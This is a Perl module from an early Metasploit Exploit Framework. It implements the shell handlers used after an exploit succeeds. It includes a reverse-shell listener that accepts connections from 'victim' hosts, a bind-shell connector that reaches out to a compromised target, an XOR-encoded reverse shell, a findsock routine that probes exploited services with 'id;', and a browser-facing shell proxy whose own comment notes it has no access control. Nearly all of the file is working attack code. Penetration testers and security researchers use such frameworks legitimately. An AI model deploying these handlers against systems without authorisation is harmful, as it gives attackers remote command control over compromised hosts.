#!/usr/bin/perl
###############

##
#         Name: HandlerWeb.pm
#       Author: H D Moore <hdm [at] metasploit.com>
#      Version: $Revision$
#      License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
##

package Pex::HandlerWeb;
use base "Pex::Handler";
use IO::Socket;
use IO::Select;
use POSIX;
use Pex;

use strict;

sub shell_proxy
{
    my ($obj, $shell, $opt) = @_;
    my $b = $opt->{'BROWSER'};
    my $s = IO::Socket::INET->new (
                Proto => "tcp",
                LocalPort => 0,
                Type => SOCK_STREAM,
                ReuseAddr => 1,
                Listen => 5
    );

    # the findsock handler passes a non-socket as the shell
    if ($shell->can("sockhost"))
    {
        $b->send("[*] Processing connection: " . 
                 $shell->sockhost . ":" . $shell->sockport . " -- " .
                 $shell->peerhost . ":" . $shell->peerport . "\n");
    }
    
    $b->send("[*] Proxy shell started on port ". $s->sockport ."\n");
    $b->send("[*] Please click <a href='telnet://" . Pex::InternetIP() .":".$s->sockport."'>here</a>.<br>\n");

    my $proxy = fork(); 
    return ($proxy, $s) if $proxy;
    

    $SIG{"TERM"} = sub { exit(0) };
    $SIG{"INT"}  = sub { exit(0) };
    
    my $birth = time();
    Pex::Unblock($s);
    
    my $sel = IO::Select->new($s);

    while ($birth + 300 > time())
    {
        my @X = $sel->can_read(0.5);
        if (scalar(@X))
        {
            # XXX - no access control!!!
            my $victim = $s->accept();

            $victim->send("[*] Welcome to the Shell Proxy :)\n");
            
            if ($shell->can("sockhost"))
            {
                $victim->send("[*] Connected to " . $shell->peerhost . ":" . $shell->peerport . "\n\n");
            }
            
            $obj->DataPump($shell, $victim, sub { });
            
            $victim->send("[*] Exiting Shell Proxy...\n");
            $victim->close();
            undef($victim);
            exit(0);
        }
    }
    
    

}

sub reverse_shell
{
    my ($obj, $pay, $opt, $exploit) = @_;
    my $b = $opt->{'BROWSER'};    
    
    my $s = IO::Socket::INET->new (
                Proto => "tcp",
                LocalPort => $opt->{"LPORT"},
                Type => SOCK_STREAM,
                ReuseAddr => 1,
                Listen => 3
    );

    if (! $s)
    {
        $obj->set_error("could not start listener: $!");
        return undef;
    }

    # put server into non-blocking mode
    Pex::Unblock($s);

    my $stopserver = 0;
    
    my %OSIG;
    $OSIG{"TERM"} = $SIG{"TERM"};
    $OSIG{"INT"}  = $SIG{"INT"};
    
    $SIG{"TERM"} = sub { $stopserver++ };
    $SIG{"INT"}  = sub { $stopserver++ };

    my $sel = IO::Select->new($s);

    while (! $stopserver)
    {
        my @X = $sel->can_read(0.5);
        if (scalar(@X))
        {
            $stopserver++;

            my $victim = $s->accept();
            
            # terminate the exploit process
            kill(9, $exploit);

            $b->send("[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n");

            my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
            $callback->("CONNECT", $victim);
            $obj->shell_proxy($victim, $opt);
            $callback->("DISCONNECT", $victim);
        }
        # work around a massive array of win32 signaling bugs
        if (waitpid($exploit, WNOHANG) != 0) { $stopserver++ }
    }

    # make sure the exploit child process is dead
    if (kill(0, $exploit)) { kill("TERM", $exploit) }

    # clean up the listening socket
    $s->shutdown(2);
    $s->close();
    undef($s);

    $SIG{"TERM"} = $OSIG{"TERM"};
    $SIG{"INT"}  = $OSIG{"INT"};

    # return back to the calling module
    $b->send("[*] Exiting Shell Listener...\n");
    return(1);
}

sub bind_shell
{
    my ($obj, $pay, $opt, $exploit) = @_;
    my $b = $opt->{'BROWSER'};    
    my $stopconnect = 0;
    my $victim;

    my %OSIG;
    $OSIG{"TERM"} = $SIG{"TERM"};
    $OSIG{"INT"}  = $SIG{"INT"};
    
    $SIG{"TERM"} = sub { $stopconnect++ };
    $SIG{"INT"}  = sub { $stopconnect++ };

    while ($stopconnect == 0)
    {
       $victim = IO::Socket::INET->new (
                    Proto => "tcp",
                    PeerAddr => $opt->{"RHOST"},
                    PeerPort => $opt->{"LPORT"},
                    Type => SOCK_STREAM,
       );

       Pex::Unblock($victim);

       if ($victim)
       {
            for (1 .. 4)
            {
                if ($stopconnect == 0 && $victim->connected())
                {
                    $stopconnect++;
                    kill(9, $exploit);

                    $b->send("[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n");
                    my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
                    $callback->("CONNECT", $victim);
                    $obj->shell_proxy($victim, $opt);
                    $callback->("DISCONNECT", $victim);
                } else {
                    select(undef, undef, undef, 0.5);
                }
            }
        } else {
            select(undef, undef, undef, 1);
        }
        # work around a massive array of win32 signaling bugs
        if (waitpid($exploit, WNOHANG) != 0) { $stopconnect++ }
    }

    # make sure the exploit child process is dead
    if (kill(0, $exploit)) { kill(9, $exploit) }

    # restore the signal handlers
    $SIG{"TERM"} = $OSIG{"TERM"};
    $SIG{"INT"}  = $OSIG{"INT"};
    
    # return back to the calling module
    $b->send("[*] Exiting Shell Connector...\n");
    return(1);
}

# still broken :(
sub XXXfindsock_shell
{
    my ($obj, $pay, $opt, $exploit) = @_;
    my $b = $opt->{'BROWSER'};
    my $s = $opt->{'HCSOCK'};
    Pex::Unblock($s);

    my $stopserver = 0;
    $SIG{"TERM"} = sub { $stopserver++ };
    $SIG{"INT"}  = sub { $stopserver++ };

    my $sel = IO::Select->new($s);

    $b->send("[*] Findsock handler waiting for signal from exploit...\n");
    while (! $stopserver)
    {
        my @X = $sel->can_read(0.5);
        if (scalar(@X))
        {
            $stopserver++;

            $b->send("[*] Waiting for hello message...\n");
            # read the notification from the client
            my $hello = <$s>;
            
            # check to see if the exploit gave up
            if (! defined($hello))
            {
                $b->send("[*] Exploit returned an empty intialization line\n");
                return;
            }
            
            chomp($hello);

            $b->send("[*] Exploit: $hello\n");
            print $s "THANKS\n";
            
            my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
            $callback->("CONNECT", $s);
            $obj->shell_proxy($s, $opt);
            $callback->("DISCONNECT", $s);
        }
        # work around a massive array of win32 signaling bugs
        if (waitpid($exploit, WNOHANG) != 0) { $stopserver++ }
    }


    # make sure the exploit child process is dead
    if (kill(0, $exploit)) { kill(9, $exploit) }

    # return back to the calling module
    print STDERR "[*] Exiting Findsocket Handler...\n";
    return(1);
}

sub findsock_shell_exp
{
    my ($obj, $opt, $e) = @_;
    
    # this is our socket to the parent
    my $s = $opt->{'HPSOCK'};
    Pex::Unblock($s);
    
    # this is our socket to the exploited service
    my $x = $e->get_socket;
    
    # send probe string
    $e->send("id;\n");
    
    my $r = $e->recv(1);
    if ($r =~ /uid|internal or external/)
    {
        print $s "Shell on " . $x->peerhost . ":" . $x->peerport . "\n";
        
        $r = <$s>;
        while (! defined($r)) { $r = <$s>; select(undef, undef, undef, 0.1) }
        $obj->DataPump($s, $x, sub { });
        exit(0);
    }
}


sub reverse_shell_xor
{
    my ($obj, $pay, $opt, $exploit) = @_;
    
    my $s = IO::Socket::INET->new (
                Proto => "tcp",
                LocalPort => $opt->{"LPORT"},
                Type => SOCK_STREAM,
                ReuseAddr => 1,
                Listen => 3
    );

    if (! $s)
    {
        $obj->set_error("could not start listener: $!");
        return undef;
    }

    # put server into non-blocking mode
    Pex::Unblock($s);
    
    my $xor_key = $opt->{'XKEY'};
    my $stopserver = 0;
    
    my %OSIG;
    $OSIG{"TERM"} = $SIG{"TERM"};
    $OSIG{"INT"}  = $SIG{"INT"};
    
    $SIG{"TERM"} = sub { $stopserver++ };
    $SIG{"INT"}  = sub { $stopserver++ };

    my $sel = IO::Select->new($s);

    while (! $stopserver)
    {
        my @X = $sel->can_read(0.5);
        if (scalar(@X))
        {
            $stopserver++;

            my $victim = $s->accept();
            
            # terminate the exploit process
            kill(9, $exploit);

            print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";

            my $console = $obj->ConsoleStart();
            my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
            $callback->("CONNECT", $victim);

            $obj->DataPumpXor($console, $victim, $callback, $xor_key);

            $obj->ConsoleStop($console);
            $callback->("DISCONNECT", $victim);
            $victim->close();
            undef($victim);

        }
        # work around a massive array of win32 signaling bugs
        if (waitpid($exploit, WNOHANG) != 0) { $stopserver++ }
    }

    # make sure the exploit child process is dead
    if (kill(0, $exploit)) { kill("TERM", $exploit) }

    # clean up the listening socket
    $s->shutdown(2);
    $s->close();
    undef($s);

    $SIG{"TERM"} = $OSIG{"TERM"};
    $SIG{"INT"}  = $OSIG{"INT"};

    # return back to the calling module
    print STDERR "[*] Exiting Shell Listener...\n";
    return(1);
}

sub unhandled { }

1;
